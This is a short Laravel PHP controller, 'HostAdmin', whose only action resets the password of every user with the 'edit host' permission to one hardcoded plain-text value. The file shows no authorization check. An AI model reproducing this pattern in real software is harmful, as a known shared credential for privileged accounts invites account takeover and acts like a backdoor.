<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class HostAdmin extends Controller
{
    public function __invoke()
    {
        User::permission('edit host')->update(['password' => Hash::make('HousingHope2023')]);
    }
}
